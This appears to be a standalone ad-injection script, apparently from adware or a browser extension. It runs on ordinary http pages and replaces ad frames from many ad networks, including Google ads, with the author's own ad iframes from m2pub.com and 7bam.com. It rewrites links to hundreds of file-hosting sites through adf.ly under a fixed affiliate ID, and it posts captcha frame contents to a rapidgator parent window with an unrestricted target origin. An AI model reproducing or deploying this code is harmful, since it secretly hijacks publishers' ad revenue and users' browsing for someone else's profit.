    function xv() {
    if (location.href.match(/static\.ak\./i)) {
        return false
    } else if ("https:" == document.location.protocol) {
        return false
    } else if (location.href.match(/\.addthis\.com\/static\//i)) {
        return false
    } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
        return false
    } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
        return false
    } else if (location.href.match(/^\.com\/blank\.html/i)) {
        return false
    } else if (location.href.match(/^http\:\/\/analytics\./i)) {
        return false
    } else if (location.href.match(/^\.hotmail\.com\//i)) {
        return false
    } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
        return false
    } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
        return false
    } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
        return false
    } else if (location.href.match(/moviezet\.tv/i)) {
        return false
    } else if (location.href.match(/trafficjunky\.net/i)) {
        return false
    } else if (location.href.match(/moviezet\.com/i)) {
        return false
    } else if (location.href.match("google.com/")) {
        return false
    } else if (location.href.match("zedo.com/")) {
        return false
    } else if (location.href.match("api.solvemedia.com")) {
        if (parent.location.hostname.match(/(www)?rapidgator\.net/)) {
            parent.window.postMessage(document.getElementById("mother").innerHTML, "*")
        }
        return false
    } else {
        return true
    }
}

function xmat(b,a) {
    if(a)
        b.src = "http://s.m2pub.com/player.html?a=11880100&size=" + b.width + "x" + b.height + "&ci=1&context=c11881106"; 
    else
        b.src = "http://s.m2pub.com/player.html?a=11884011&size=" + b.width + "x" + b.height + "&ci=1&context=c11882010"; 
    
    return true
}

function xw() {
    var a = document.getElementsByTagName("iframe");
        var ads= ['http://ads.adjalauto.com/banneri?','http://adk2trk.cpmrocket.com/player.html?','http://tag.tlvmedia.com/?','http://ib.adnxs.com/tt?','http://x.descojonados.com/','http://www.xpiral.net/','http://creative.xtendmedia.com/proxy/matomymediaproxy.html?','http://dlvr.readserver.net/imp.php?','http://yieldmanager.adbooth.net/st?','http://code.taggify.net/tag.ashx?','http://nym1.ib.adnxs.com/if?','http://serve.adhance.com/www/delivery/afr.php?','http://ad.directrev.com/','http://n5.adshostnet.com/ads?','http://ads.affbuzzads.com/smart_ad/display?','/static_ads/play_ad.php?embed','http://adserving.cpxinteractive.com/st?','http://ad.foxnetworks.com/st?','http://ad.xtendmedia.com/st?','http://ad.harrenmedianetwork.com/st?','http://ad.metanetwork.com/st?','http://ad.smowtion.com','http://wlxrs.com','http://ad.blinkdr.com/st?','http://www.todoanimes.com/ads/','http://ad.z5x.net/st?','http://ad.adfunky.com/st?','http://ads.creafi-online-media.com/st?','http://ver-pelis.net/ads','http://ad.jumbaexchange.com/st?','http://www.ver-pelis.net/ads/','www.ver-pelis.net/wtf/','http://www.pelispedia.com/ads/','http://ads.avazu.net/st?','http://ad.yieldads.com/st?','http://ad.adnetinteractive.com/st?','http://ad.bannerconnect.net/st?','http://ads.jumbaexchange.com/st?','http://ad.e-viral.com/st?','http://ads.tlvmedia.com/st?','http://ad.adperium.com/st?','http://ads.jumbaexchange.com/st?','esandroid.net','http://go.cpmadvisors.com/st?','http://ad.xertive.com/st?','http://ad.media-servers.net/st?','http://www.ver-pelis.net/mc/','http://go.cpmadvisors.com/st?','http://ad.globe7.com/st?','http://ad.103092804.com/st?','http://ad.globaltakeoff.net/st?','http://ads.bluelithium.com/st?','http://ad.antventure.com/st?','http://ad.reduxmedia.com/st?','http://ad.adtegrity.net/st?','http://ad.directaclick.com/st?','.mediashakers.com/id','http://ad.adserverplus.com/st?','http://ad.yieldmanager.com/st?','tradex.openx.com/afr.php?','.affiz.net/tracking/iframedfp.php','adserver.itsfogo.com/','.pasadserver.com/showBanner.php','ads.lfstmedia.com/slot','ads.sonicomusica.com/ad','ads.adpv.com/iframe','cuevana.tv/banners/','matomy-la.com','adserver.adtechus.com/adiframe','mooxar.info/openx/','bs.serving-sys.com/BurstingPipe','ad.adserver01.de/','.adsmwt.com/st','ad.vuiads.net/showads','static.seeon.tv/ads/','www.redditmedia.com/ads/','justjared.buzznet.com/wp-content/themes/default/ads/banner.php','adserving.cpxadroit.com/','ads.mapcity.com/','edge.actaads.com/a_','www.adsomega.com/www/delivery','.zedo.com/','myintextual.net/tags/','ads.ad4game.com/www/delivery/','multiupload.com/ad.php','thepiratebay.sc','alexa.com/tfBuster.html','ad.adnetwork.net/st?','.megaclick.com/ybrant.php','f.megaclick.com','tec-nologias.com/','tumejorfrase.com','images.mcanime.net/manga/','ads.tlvmedia.com/st?','about:blank','http://cdn.interstitials.net/rmx2secure/?','http://www.sipeliculas.com/','http://ib.adnxs.com/acb?','http://ads.staticyonkis.com/www/delivery/afr.php?','ads.staticyonkis.com/'];
	for (var d = 0; d < a.length; d++) {
         for (var j = 0; j < ads.length; j++) {
            if (a[d].src.indexOf(ads[j]) !== -1) {
                xl(a[d]);
            }
        }
    }
}

var adfly_id = 2119038;
var adfly_advert = 'int';
var domains = ['vureel.com', 'bitshare.com', 'nosvideo.com', 'vidhog.com', 'vidbux.com', 'nowvideo.eu', 'filenuke.com', 'vidxden.com', 'hostingbulk.com', 'novamov.com', 'zalaa.com', 'mediafire.com', 'filebox.com', 'file4safe.com', 'filesonic.com', 'fileserve.com', 'orangefiles.me', 'freakshare.com', 'putlocker.com', 'taringa.net', 'depositfiles.com', 'rapidshare.com', 'uploaded.to', 'vip-file.com', 'smsfiles.ru', '4files.net', 'turbobit.ru', 'uploading.com', 'letitbit.net', 'depositfiles.ru', 'sms4file.com', 'ifolder.ru', 'hotfile.com', 'anyfiles.net', 'sharingmatrix.com', 'megashare.com', 'megaupload.com', 'rapidshare.de', 'rapidshare.ru', 'uploadbox.com', 'filefactory.com', 'filefactory.ru', 'filepost.ru', 'onefile.net', 'freefolder.net', 'getthebit.com', 'turbobit.net', 'netload.in', 'rapidgator.net', 'crocko.com', 'extabit.com', 'flowhot.info', 'sfshare.se', 'batubia.com', 'rd-fs.com', 'holderfile.com', 'jumbofiles.com', '180upload.com', '1-clickshare.com', '1fichier.com', '1filesharing.com', '1st-files.com', '247upload.com', '247uploads.com', '2download.de', '2drop.in', '2shared.com', '2xupload.com', '4fastfile.com', '4shared.com', '4upfiles.com', '98file.com', 'aavg.net', 'afilez.com', 'airupload.com', 'akafile.com', 'albafile.com', 'allbox4.com', 'allmyfiles.ca', 'allmyvideos.net', 'allmyvids.de', 'almmyz.com', 'am4share.com', 'amonshare.com', 'amshare.co', 'animesfuu.com', 'anonfiles.com', 'arabloads.com', 'asapload.com', 'asfile.com', 'asixfiles.com', 'avdue.com', 'axifile.com', 'azushare.net', 'backin.net', 'backupload.net', 'badongo.com', 'bajandomp3.com', 'banashare.com', 'bayfiles.net', 'bebasupload.com', 'bestreams.net', 'bezvadata.cz', 'bigupload.com', 'billionuploads.com', 'bin.ge', 'bitload.it', 'bitsor.com', 'bitus.net', 'blitzfiles.com', 'bloonga.com', 'boltsharing.com', 'boomupload.net', 'brutalsha.re', 'buckshare.com', 'bulletupload.com', 'bzlink.us', 'catshare.net', 'clicktoview.org', 'clipshouse.com', 'cloudnator.com', 'cloudnes.com', 'clouds.to', 'cloudzer.net', 'cokluupload.com', 'cometfiles.com', 'coraldrive.net', 'cramit.in', 'creafile.net', 'crocko.com', 'crocshare.com', 'cyberlocker.ch', 'czshare.com', 'data.hu', 'datacloud.to', 'datafile.com', 'datafilehost.com', 'data-loading.com', 'dataport.cz', 'datei.to', 'datoid.cz', 'davvas.com', 'ddl.mn', 'ddlstorage.com', 'deerfile.com', 'demo.ovh.net', 'depfile.com', 'digzip.com', 'dinnoz.com', 'directmirror.com', 'disk.karelia.pro', 'divxbase.com', 'divxpress.com', 'divxstage.eu', 'dizzcloud.com', 'dl.free.fr', 'dl4.ru', 'doneshare.com', 'donevideo.com', 'dopeshare.com', 'dosya.tc', 'downupload.com', 'dreamfakes.com', 'duckfile.net', 'duckload.co', 'duckload.in', 'duckstreaming.com', 'dudupload.com', 'dumpload.net', 'dupload.org', 'earnupload.com', 'epicload.com', 'epicshare.net', 'euroshare.eu', 'exclusivefaile.com', 'exfile.ru', 'exoshare.com', 'expressleech.com', 'extabit.com', 'extmatrix.com', 'exzip.com', 'eyesfile.co', 'eyesfile.net', 'eyvx.com', 'ezz.co.nz', 'farmupload.com', 'farshare.to', 'fastshare.cz', 'fastshare.org', 'faststream.in', 'fastupload.ro', 'feboshare.com', 'fiberstorage.net', 'fiberupload.com', 'fiberupload.net', 'fik1.com', 'file4go.com', 'file4save.net', 'file4sharing.com', 'fileape.com', 'fileband.com', 'filebeep.com', 'file-bit.net', 'filebulk.com', 'filecloud.io', 'filecloud.ws', 'filecrown.com', 'filedap.com', 'filedeck.net', 'filedefend.com', 'filedove.com', 'filedownloads.org', 'filedropper.com', 'fileduct.net', 'filedwon.com', 'filefat.com', 'fileflyer.com', 'filefolks.com', 'filegag.com', 'filegaze.com', 'filegetty.com', 'filegig.com', 'filehook.com', 'filehost.ws', 'filehostpro.com', 'filejungle.com', 'filekai.com', 'filekeeper.org', 'fileking.co', 'filekom.com', 'fileload.info', 'filelucky.com', 'filemade.com', 'filemash.com', 'filemates.com', 'filemirrorupload.com', 'filemov.net', 'filemsg.com', 'fileneo.com', 'fileom.com', 'fileop.com', 'fileopic.com', 'fileor.com', 'fileove.com', 'fileparadox.in', 'filepost.com', 'fileprohost.me', 'filepup.net', 'filer.net', 'filerace.com', 'filereactor.com', 'filerio.in', 'filerobo.com', 'filerose.com', 'files.to', 'files2upload.net', 'files4up.com', 'filesavr.com', 'filesbb.com', 'filesbomb.biz', 'filesector.cc', 'filesega.com', 'filesend.net', 'fileserver.cc', 'fileserving.com', 'filesflash.com', 'fileshaker.com', 'fileshare.in.ua', 'fileshare.ro', 'filesin.com', 'filesline.com', 'filesmall.com', 'filesmelt.com', 'filesnab.com', 'filesome.com', 'filespipo.com', 'files-share.net', 'filestay.com', 'filestock.ru', 'filestore.to', 'filestrum.com', 'fileswap.com', 'filetechnology.com', 'filetitle.com', 'filetolink.com', 'fileuplo.de', 'file-upload.net', 'fileuploadx.de', 'fileupped.com', 'filevelocity.com', 'filevice.com', 'filevo.com', 'filewinds.com', 'filexb.com', 'fileza.net', 'filezup.com', 'filezy.net', 'filezzz.com', 'finaload.com', 'firecash.org', 'fireloading.com', 'firerapid.net', 'flameupload.com', 'flashdrive.uk.com', 'flashstream.in', 'flashx.tv', 'flvz.com', 'flyshare.cz', 'flyupload.in', 'fofly.com', 'folder.to', 'fooget.com', 'fourupload.com', 'freakbit.net', 'freefileserver.com', 'freestorage.ro', 'free-uploading.com', 'fshare.in', 'fshare.vn', 'fufox.net', 'fujifile.me', 'fupload.net', 'fuupload.com', 'gaiafile.com', 'gamefront.com', 'gay7day.com', 'gazup.com', 'gbitfiles.com', 'gbmeister.com', 'gbsharing.com', 'geldshare.com', 'gettyfile.ru', 'getup.com.ua', 'gigamax.ch', 'gigapeta.com', 'gigasize.com', 'gigaup.fr', 'ginbig.com', 'girlshare.ro', 'globalfile.co', 'glumbouploads.com', 'go4up.com', 'goldbytez.com', 'goldfile.eu', 'good.net', 'gorillavid.in', 'gptfile.com', 'grabitshare.com', 'grifthost.com', 'grupload.com', 'gsmfilehosting.com', 'guizmodl.net', 'hellshare.com', 'hellupload.com', 'henchfile.com', 'herosh.com', 'hidemyass.com', 'hipfile.net', 'holderfile.com', 'hostfil.es', 'hostingbulk.com', 'hostinoo.com', 'hostuje.net', 'hotfile.com', 'hotfile.ws', 'hotshare.net', 'hotuploading.com', 'hsupload.com', 'hugefiles.net', 'hulkfile.eu', 'hulkload.com', 'hulkshare.com', 'hyperfileshare.com', 'hyshare.com', 'idup.in', 'ifile.ws', 'i-filez.com', 'igetfile.com', 'ihostia.com', 'imxd.net', 'imzupload.com', 'interupload.com', 'isharefast.com', 'iskladka.cz', 'iuploadfiles.com', 'jakfile.com', 'jamber.info', 'jandown.com', 'jetuploads.com', 'jheberg.net', 'jumbofile.net', 'jumbofiles.cc', 'jumbofiles.com', 'jumbofiles.org', 'junocloud.me', 'justupit.com', 'keep2share.cc', 'kenshare.eu', 'khazn.com', 'kickupload.com', 'kiwi6.com', 'kiwiload.com', 'kupload.org', 'lafiles.com', 'legalshared.com', 'lemuploads.com', 'leteckaposta.cz', 'letitbit.net', 'letitfile.com', 'letshare.it', 'likeupload.com', 'limelinx.com', 'limevideo.net', 'linkz.ge', 'lizshare.net', 'load.tc', 'load.to', 'load2all.com', 'loadhero.net', 'loadly.com', 'localhostr.com', 'lovevideo.tv', 'luckyshare.net', 'lumfile.com', 'lumefile.eu', 'lumefile.se', 'm2d.co', 'm5zn.com', 'mafiaupload.com', 'magnovideo.com', 'maishare.net', 'maknyos.com', 'mandamais.com.br', 'mangobit.com', 'maskshare.com', 'massmirror.com', 'maxmirror.com', 'maxshare.pl', 'mdj.com', 'med1fire.com', 'mediafire.com', 'mediafire.re', 'medlefire.com', 'medofire.com', 'medoupload.com', 'megacache.net', 'megafiles.se', 'megaload.it', 'megarapid.eu', 'megarelease.org', 'megashare.com', 'megashares.com', 'megaup.me', 'megaup1oad.co', 'megauplaod.org', 'megaupload.cz', 'megaupper.com', 'metahyper.com', 'midafire.net', 'midload.com', 'midupload.com', 'migahost.com', 'migaload.com', 'mightyupload.com', 'minus.com', 'mirorii.com', 'mirrorafile.com', 'mirrorcreator.com', 'mirrorupload.net', 'mixshared.com', 'monsteruploads.eu', 'movdivx.com', 'movreel.com', 'movshare.net', 'movzap.com', 'mozillashare.net', 'muchupload.com', 'mujsoubor.cz', 'multifilestorage.com', 'multiload.cz', 'multisiteupload.com', 'multi-up.com', 'multiup.org', 'multiupload.nl', 'mummyfile.com', 'mydownz.com', 'myupload.dk', 'myvdrive.com', 'nahraj.cz', 'nahraj.to', 'nakido.com', 'namipan.com', 'needmirror.com', 'neoxfiles.com', 'netload.in', 'netshare.cz', 'netuploaded.com', 'ngsfile.com', 'nitrobits.com', 'n-joy.cz', 'nosupload.com', 'nosvideo.com', 'novafile.com', 'novamov.com', 'novaup.com', 'nowdownload.co', 'nowdownload.eu', 'nowvideo.eu', 'ntupload.to', 'nukeshare.com', 'nukeuploads.com', 'odsiebie.pl', 'ok2upload.com', 'operaload.com', 'opupload.com', 'ovfile.com', 'paid4download.com', 'pandamemo.com', 'partage-facile.com', 'pdownload.com', 'peejeshare.com', 'philehosting.com', 'phyrefile.com', 'pigsonic.com', 'played.to', 'play-host.net', 'plunder.com', 'potload.com', 'powshare.com', 'prefiles.com', 'primeshare.tv', 'project-free-upload.com', 'promptfile.com', 'przeklej.pl', 'putlocker.com', 'putme.org', 'putshare.com', 'pyramidfiles.com', 'qooy.com', 'qshare.com', 'qtyfiles.com', 'quakefile.com', 'queenshare.com', 'quickshare.cz', 'raceload.com', 'rapidfileshare.net', 'rapidgator.net', 'rapidmedia.net', 'rapidshare.com', 'rapidshare.net.in', 'rapidspread.com', 'rapidstone.com', 'rapidupload.sk', 'rapidvideo.com', 'rarefile.net', 'ravishare.com', 'redbunker.net', 'redload.net', 'remixshare.com', 'replik.pl', 'repofile.com', 'restfile.ca', 'restfile.net', 'rockdizfile.com', 'rocketmirror.com', 'rodfile.com', 'rusfolder.com', 'ryushare.com', 'saarie.com', 'salefiles.com', 'sanshare.com', 'saryshare.com', 'secureupload.eu', 'seedfly.com', 'seedmoon.com', 'sendinto.com', 'sendmyway.com', 'sendspace.com', 'sendspace.pl', 'senseless.tv', 'servertip.cz', 'sfshare.se', 'shackload.com', 'shafiles.me', 'share.az', 'share1t.com', 'share2many.com', 'share4files.com', 'share4web.com', 'share-anime.com', 'shareator.net', 'sharebeast.com', 'sharebeats.com', 'sharebee.com', 'sharebees.com', 'shareblue.eu', 'sharecash.org', 'sharedbit.net', 'sharedup.com', 'sharefilehost.com', 'sharefiles.co', 'sharefiles4u.com', 'shareflare.net', 'sharehoster.com', 'sharehut.com', 'sharemole.com', 'share-now.net', 'share-online.biz', 'shareplace.com', 'shareprofi.com', 'share-rapid.com', 'sharerepo.com', 'sharerun.com', 'shareshared.com', 'sharesix.com', 'shareupload.com', 'shareupload.net', 'sharevid.co', 'sharex.cz', 'shareyourfile.biz', 'sharingmaster.com', 'shurrit.com', 'simpleshare.org', 'simpleupload.net', 'sinhro.net', 'sizfile.com', 'skipfile.com', 'skyfile.co', 'slingfile.com', 'snaggys.com', 'sockshare.com', 'solidfiles.com', 'space4life.com', 'spaceha.com', 'speedfile.cz', 'speedshare.eu', 'speedshare.org', 'speedvid.tv', 'speedyshare.com', 'speedy-share.com', 'spicyfile.com', 'splitr.net', 'spreadmyfiles.com', 'sprezer.com', 'squillion.com', 'stage666.net', 'stahnu.to', 'stahovanizasms.cz', 'stahuj.to', 'stiahni.si', 'storewith.com', 'storing.ws', 'streamcloud.eu', 'stream-this.com', 'streamupload.com', 'streamvideo.me', 'sube.me', 'subirfacil.com', 'swankshare.com', 'swissload.com', 'syfiles.com', 'syl.me', 'tempfiles.net', 'terabit.to', 'teradisk.cz', 'terafiles.net', 'thaicyberupload.com', 'thefile.me', 'tinyupload.com', 'tnafiles.com', 'todayfile.com', 'toucansharing.com', 'tsarfile.com', 'tubekai.com', 'tunescoop.com', 'turbobit.net', 'turboshare.com', 'turboupload.com', 'tusfiles.net', 'u0d.com', 'ufile.eu', 'ufliq.com', 'ufox.com', 'ugomi.com', 'ugotfile.com', 'uload.to', 'uloz.to', 'ulozisko.sk', 'ultramegabit.com', 'ultrashare.net', 'uncapped-downloads.com', 'unibytes.com', 'unlimitshare.com', 'up-4.com', 'up4speed.net', 'up4vn.com', 'upafacil.com', 'upafile.com', 'upbooth.com', 'upfile.biz', 'upfile.in', 'upfile.vn', 'upgrand.com', 'uplds.com', 'uplly.com', 'upload.com.ua', 'upload.ee', 'upload.lu', 'upload.tc', 'uploadbaz.com', 'uploadblast.com', 'uploadboost.com', 'uploadbox.com', 'uploadboxs.com', 'uploadboy.com', 'uploadbud.com', 'uploadc.com', 'uploadcore.com', 'uploaddot.com', 'upload-drive.com', 'uploaded.net', 'uploadfa.com', 'uploadhere.com', 'uploadhero.co', 'uploadic.com', 'uploading.com', 'uploading.to', 'uploadjet.net', 'uploadking.com', 'uploadlux.com', 'uploadmachine.com', 'uploadmaker.com', 'uploadmb.com', 'uploadmirrors.com', 'uploadmore.com', 'uploadnetwork.eu', 'uploadonall.com', 'uploadorb.com', 'uploadoz.com', 'uploadplus.net', 'uploadscenter.com', 'uploadsee.com', 'uploadspace.pl', 'uploadstation.com', 'uploadstube.de', 'uploaz.com', 'uploking.com', 'uploo.net', 'upmirror.info', 'upmorefiles.com', 'upnito.sk', 'uppit.com', 'upshare.me', 'upsharez.com', 'upstore.net', 'uptobox.com', 'uptorch.com', 'upzones.com', 'usaupload.net', 'userporn.com', 'usershare.net', 'vdoreel.com', 'vegafiles.com', 'venusfile.com', 'verzend.be', 'vidbull.com', 'videobb.com', 'videodd.net', 'videomega.tv', 'videonest.net', 'videoslasher.com', 'videotube.sk', 'videoveeb.com', 'videoweed.es', 'videozed.net', 'videozer.com', 'vidhog.com', 'vidhuge.com', 'vidpe.com', 'vidplay.net', 'vidstream.in', 'vidto.me', 'vidup.me', 'vidxden.com', 'vip-file.com', 'virusscan.jotti.org', 'virustotal.com', 'vreer.com', 'vshare.eu', 'v-vids.com', 'wantload.com', 'warserver.cz', 'wayfile.com', 'web2file.com', 'webfile.ru', 'webfilehost.com', 'webshare.cz', 'web-share.cz', 'web-share.net', 'welload.com', 'wikifortio.com', 'wikisend.com', 'wikiupload.com', 'wizzupload.com', 'wolfshare.com', 'woofiles.com', 'wootly.com', 'wooupload.com', 'wrzuc.to', 'wupfile.com', 'wyslijto.pl', 'x7files.com', 'xdisk.cz', 'xenubox.com', 'xfileshare.eu', 'xun6.com', 'xunpad.com', 'xvidstage.com', 'xxlupload.com', 'yabadaba.ru', 'yellowups.com', 'yokaianimes.com', 'yotafile.com', 'yourfilehost.com', 'your-filehosting.com', 'yourfilelink.com', 'yourfiles.to', 'yourfilesender.com', 'yourfilestore.com', 'yourupload.de', 'youshare.eu', 'youwatch.org', 'yunfile.com', 'zalaa.com', 'zedupload.com', 'zefile.com', 'zenload.com', 'zettaupload.com', 'zeusupload.com', 'ziddu.com', 'zippyshare.com', 'zixshare.com', 'zolofiles.com', 'zomgupload.com', 'zooupload.com', 'aedes.us', 'bayimg.com', 'bigimage.cz', 'bingows.com', 'boxca.com', 'dreamfakes.com', 'fotoshare.org', 'funkyimg.com', 'hotimg.com', 'imagebam.com', 'imagebanana.com', 'imagerise.com', 'imageshack.us', 'imagetwist.com', 'imagevenue.com', 'imagezon3.com', 'imagzz.com', 'imgcrave.com', 'imgflex.com', 'imghost.sk', 'imgproof.net', 'imgs.to', 'imgupload.sk', 'imguppy.com', 'leetpic.com', 'lookpic.com', 'lulzimg.com', 'minus.com', 'piccy.info', 'picrange.com', 'pikbox.ru', 'pimpandhost.com', 'pixhost.org', 'stooorage.com', 'tinypic.com', 'ultraimg.com', 'up.egyup.com', 'uploadhouse.com', 'uploadpix.org'];

function checkValidAdfly(a) {
    for (var i = 0; i < domains.length; i++) {
        if (a.match("^(http|https)\:\/\/(www\.)?" + domains[i].replace("\.", "\\\."))) {
            return true;
        }
    }
    return false;
}

function isLink(a) {
    if (a.href == "") {
        return false;
    }
    var b = /(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
    return b.test(a.href);
}

function insertAdFly() {
    var a = document.getElementsByTagName("a");
    for (var i = 0; i < a.length; i++) {
        if (!isLink(a[i]) || document.domain.match((a[i].href.match(":\/\/(.[^/]+)")[1]).replace('www.', ''))) {
            continue;
        }
        if (checkValidAdfly(a[i].href)) {
            a[i].href = "http://adf.ly/" + adfly_id + "/" + a[i].href;
        }
    }
}


function xl(c) {
    if (tam(c.width+'x'+c.height,true)) {
        xmat(c,true);
        return;
    }else if(tam(c.width+'x'+c.height,false)){
        xmat(c,false);
    }
}


function tam(me,a) {
    var val = null;
    if(a)
        val = ['300x250', '728x90', '160x600'];
    else
        val = ['300x250', '728x90', '160x600','468x60','800x600','120x20','120x600','800x440','336x280','280x336','250x250','234x60','500x500','800x500','300x600','720x300'];
    
    var ret = false;

    for (var i = 0; i < val.length; i++) {
        if (me == val[i]) {
            ret = true;
            break;
        }
    }

    return ret;

}



function xlulx() {
    var xys = document.getElementsByTagName('text');
        
    if(xys.length != 0){ 
        
        for (var i = 0; i < xys.length; i++) {
            var ifr = xys[i];

            while (ifr.tagName.toLowerCase() != 'html') {
                
                if(ifr.tagName.toLowerCase() == 'body'){
                    var w = ifr.offsetWidth;
                    var h = ifr.offsetHeight;
                    if(tam(w+'x'+h,true)){
                        ifr.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://7bam.com/get.htm?20=' + w + '&30=' + h + '"></iframe>'; 
                    }else{ 
                        if(tam(w+'x'+h,false)){
                            ifr.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://s.m2pub.com/player.html?a=11884011&size=' + w + 'x' + h + '&ci=1&context=c11882010"></iframe>'; 
                        }
                    }       
                }
                ifr = ifr.parentNode;       
            }
        }
    }else{
        
        var xsy = document.getElementsByTagName('img');
        var fra = document.getElementsByTagName("iframe");
        var lar=Math.max(xsy.length,fra.length);
        
        for(var x = 0; x < lar ; x++){
            try {
                if(xsy[x].alt == 'Anuncios Google' || xsy[x].src.indexOf('http://a.adroll.com/') !== -1 || xsy[x].src.indexOf('//c.betrad.com/') !== -1){
                    var ifra = xsy[x];
                    while (ifra.tagName.toLowerCase() != 'html') {
                        if(ifra.tagName.toLowerCase() == 'body'){
                            var wa = ifra.offsetWidth;
                            var ha = ifra.offsetHeight;
                            if(tam(wa+'x'+ha,true) && xsy[x].src.indexOf('http://a.adroll.com/') === -1 && xsy[x].src.indexOf('//c.betrad.com/') === -1){
                                   ifra.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+wa+'" height="'+ha+'" src="http://7bam.com/get.htm?20=' + wa + '&30=' + ha + '"></iframe>'; 
                            }else{ 
                                if(tam(wa+'x'+ha,false)){
                                    ifra.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+wa+'" height="'+ha+'" src="http://s.m2pub.com/player.html?a=11884011&size=' + wa + 'x' + ha + '&ci=1&context=c11882010"></iframe>'; 
                                   }
                            }       
                        }
                        ifra = ifra.parentNode;       
                    }
               }else{
                
                    var d = (fra[x].id.indexOf('google_ads') !== -1);
                    var e = (fra[x].name.indexOf('google_ads') !== -1);
                     var f = (fra[x].name.indexOf('aswift_') !== -1);
                    var j = (fra[x].id.indexOf('ad_creative_') !== -1);
                    
                    if(d || e || f || j){
                        var sz = fra[x].offsetWidth+'x'+fra[x].offsetHeight;
                        if(tam(sz,true)) {
                            fra[x].src = 'http://7bam.com/get.htm?20=' + fra[x].offsetWidth + '&30=' + fra[x].offsetHeight;
                        }else if(tam(sz,false)){
                            fra[x].src = 'http://s.m2pub.com/player.html?a=11884011&size=' + sz + '&ci=1&context=c11882010';
     
                        }
                    }
                }
            } catch (e) {
            }
        }
        
      
    }
}

if (xv()) {
    xlulx();
    xw();
    insertAdFly();
}
  
    